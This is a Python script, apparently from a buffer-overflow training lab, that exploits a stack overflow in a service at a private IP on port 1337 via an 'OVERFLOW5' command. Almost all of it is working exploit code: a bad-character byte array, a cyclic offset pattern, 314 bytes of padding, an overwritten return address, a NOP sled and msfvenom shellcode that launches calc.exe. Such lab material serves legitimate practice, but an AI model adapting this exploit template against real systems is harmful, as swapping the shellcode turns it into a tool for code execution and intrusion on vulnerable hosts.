

import socket


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip = '10.10.107.7'
port = 1337

s.connect((ip,port))

msg = s.recv(2048).decode()
print(msg)
allbytes = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


pattern = 'Z1Ornrcd6CobOj3PoFvJma8ugyk5eUnFtgkm1PlU6ZV8ikMBtvbdFDmB9YDeaVN1tckISYVG0xN2ayUoQuXhf8ezG8FGvQGNJ61lyc6g2uJULAykN0xx14gbOPIUeygBacZ4ip7iOIatM8YhV53zhm40Kdok6cu5IloD7XeNqFiqrdqr21c9PTdjOowbqpNWMc90mtE0wfGecD0unVZgN7FBOAEZ02YANEoTPZ3Vv1budq0pFILp6p6C49J9mdgy24jkTM7TFw1YQ4XUQV4YGbtgmu1kePIWmSz6MSDeM1FJ5OM5iU9gm4tThcOm8GJT3ZI26tAzSCSBhuKqA2AOjnFWX8AoUhFtTRr5OQ0MsIE5ZcnBMTeK6h4PGwpqJGyxPmtFAqeiczVH3tN0CfFOylxIm2R7T7bl3ysL2F0mStOTeuE5lETfL6M0kL7endBE3NsYHAY6siVDau3OflGpvYheCNJE0AHgAHngVFnSt3Zjp2PwYu3cU3Kd1BUFGHMXp5EMWIVkpOWXUeWsIoIEsld0YaBke3PsuawwQABgduKBTf2N4ApZkh3N9jRj8onUCULhjDL2LWda4IirzksHetBVbNaJarI0Pqg3ikdx9SY6skg7cczT2NmcjnzCRbrySvZ2St33XR4nJAibQWzbjb21ayi1jpOf6c32mNU9OXkMzZJFK5z2cTExFL2nVAozIsOUbXFvNm1t1owLC6fVpHcW7odXk4luqONr812AB0mTu1SP7A5HAqjjYyUpsaQPHrsLWvzobL2CkOzEBWuUF5Y9WG9fmiEzBeOp3roLteJZCpQJ6QVfRN516de43LJWzTpI7cTm2Upi9JnIxU6LUTtkzjHOywpRWKq4F3EmfSwDjJadkBRR4ZvGjEYezK7EM3LuQfRFVfBHogmOCzhW620p7bgwymeptG3yFIAcRKijpMJ0GqHjufGwJQgFz69SCcpCCZafj9eI9QyE4B228pnlYwSKmaueQB6pPghr68rTxfIA8mQijH3wkzb8KqPZQjBR8Cy1bSBWJ6S1T7c1Rjp6Es7AH3m3gGzJIth89becOEdfIiuGTzzc0S20GNU2OJ0VL9QFKLlkj3KUDMFqYo16y4BHXAPYKaLSaDOoTCzV5hZBDMVph1ZXIgXlD5aKaHAQrKUoLjSo9KHRZPqCvl1SimaYpt5DUg3KjBOpnnAMGftYbDzMTY9Hb9lou587ZCMfin3jzPY1fPbOiXg0oMDwtgZqczlNEdi61A4vF0pTzyunjFfMnYYyT9AZYAn3IWNBAINkRKJYpKrq4oq3RW5xcxvcn33aVptwyWOwARkcLBOnoLFy0UDJyIwmzNsFb1D2aiseFx29gmdkfupZvmo9EmjSu9B9KDUbYHMW76g5Zp4cbgHgDvWF3GFt62drGpaTu0rHRlJzAFXd1Cl8kJfD8G4cLDQcvfEkvs5KTUDVbMGTsuufCAxUIsg5ZOr4sDTkczsAukaeoKzOrTQGeI6kRFNY'

#0195FA30   5A33544A  JT3Z esp 318
# \x00\x16\x2f\xf4\xfd

junk = 'A'*314
eip = '\xaf\x11\x50\x62'

esp = '\x90'*20

#msfvenom -p windows/exec cmd=calc.exe -b "\x00\x16\x2f\xf4\xfd" -f c
esp += ("\xfc\xbb\xc2\x5c\x09\x19\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x3e\xb4\x8b\x19\xbe"
"\x45\xec\x90\x5b\x74\x2c\xc6\x28\x27\x9c\x8c\x7c\xc4\x57\xc0"
"\x94\x5f\x15\xcd\x9b\xe8\x90\x2b\x92\xe9\x89\x08\xb5\x69\xd0"
"\x5c\x15\x53\x1b\x91\x54\x94\x46\x58\x04\x4d\x0c\xcf\xb8\xfa"
"\x58\xcc\x33\xb0\x4d\x54\xa0\x01\x6f\x75\x77\x19\x36\x55\x76"
"\xce\x42\xdc\x60\x13\x6e\x96\x1b\xe7\x04\x29\xcd\x39\xe4\x86"
"\x30\xf6\x17\xd6\x75\x31\xc8\xad\x8f\x41\x75\xb6\x54\x3b\xa1"
"\x33\x4e\x9b\x22\xe3\xaa\x1d\xe6\x72\x39\x11\x43\xf0\x65\x36"
"\x52\xd5\x1e\x42\xdf\xd8\xf0\xc2\x9b\xfe\xd4\x8f\x78\x9e\x4d"
"\x6a\x2e\x9f\x8d\xd5\x8f\x05\xc6\xf8\xc4\x37\x85\x96\x1b\xc5"
"\xb0\xd5\x1c\xd5\xba\x49\x75\xe4\x31\x06\x02\xf9\x90\x62\xfc"
"\xb3\xb8\xc3\x95\x1d\x29\x56\xf8\x9d\x84\x95\x05\x1e\x2c\x66"
"\xf2\x3e\x45\x63\xbe\xf8\xb6\x19\xaf\x6c\xb8\x8e\xd0\xa4\xdb"
"\x51\x43\x24\x35\xf7\xe3\xcf\x49\xf7\x13\x10\x49\xf7\x13\x10")

junk2 = 'D'*(1500-len(junk+eip +esp))

payload = 'OVERFLOW5 ' + junk + eip + esp +junk2
payload = payload.encode('raw_unicode_escape')

s.send(payload)

s.close()
